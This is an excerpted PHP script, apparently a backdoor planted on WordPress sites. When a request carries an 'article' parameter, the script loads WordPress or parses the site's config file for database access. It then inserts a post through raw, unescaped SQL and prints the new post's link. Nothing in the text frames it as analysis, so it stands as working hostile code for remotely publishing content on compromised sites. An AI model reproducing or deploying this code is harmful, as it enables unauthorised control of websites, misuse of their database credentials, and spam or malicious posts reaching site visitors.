...
if (array_key_exists ('article', $_REQUEST))
{
  ...
  $include_return = include_once ($load_path);

  if ($include_return && function_exists('wp_insert_post') && function_exists('get_permalink')) {
    print "#loaded wp-load#\n";
    wp_load_insert_post();
  } else {
    print "#Failed to load wp-load, trying to parse config directly#\n";
    list ($dbh_connect, $dbh_query, $dbh_error, $dbh_escape) = get_mysql_mysqli_handlers ();

    $conf_path  = get_conf_path ();
    $wp_prefix  = 'wp_';
    $connection = connect_using_parse_config ($conf_path);
    
    if ($connection)
    {
      print "#success connection using parse#\n";
    }
    else
    {
      print "#failed to connect using parse#\n";
      die;
    }

    config_parse_insert_post();
  }
}
else
{
...
function config_parse_insert_post()
{
  list ($content, $title) = get_article ();  
  
  $post_id = sql_wp_insert_post (
    array(
    'post_title' => $title,
  ...
  if ($post_id)
  {
    $link = sql_get_permalink($post_id);
...
function sql_wp_insert_post($sargs)
{
  $args = array(
    'post_title'                => $sargs['post_title'],
    'post_content'              => $sargs['post_content'],
    'post_status'               => $sargs['post_status'],
    'post_date'                 => $sargs['post_date'],
    'post_date_gmt'             => $sargs['post_date'],
    'post_author'               => $sargs['post_author'],
    'post_type'                 => $sargs['post_type'],
    'post_modified'             => $sargs['post_date'],
    'post_modified_gmt'         => $sargs['post_date'],
  ...
  $result = execute_query ("INSERT INTO " . $wp_prefix . "posts (`post_title`, `post_content`, `post_status`, `post_date`, `post_date_gmt`, `post_author`, `post_type`, `post_modified`, `post_modified_gmt`, `post_excerpt`, `to_ping`, `pinged`, `post_content_filtered`) VALUES ('".$args['post_title']."','".$args['post_content']."','".$args['post_status']."','".$args['post_date']."','".$args['post_date']."','".$args['post_author']."','".$args['post_type']."','".$args['post_modified']."','".$args['post_modified_gmt']."','".$args['post_excerpt']."','".$args['to_ping']."','".$args['pinged']."','".$args['post_content_filtered']."')");
  
  return $connection->insert_id;
}

function sql_get_permalink($post_id)
{
  $conf_path = get_conf_path();
  $count = substr_count($conf_path, '../');
  ...
  return $abs_url . "?p=$post_id";
}

function wp_load_insert_post()
{
  list ($content, $title) = get_article ();
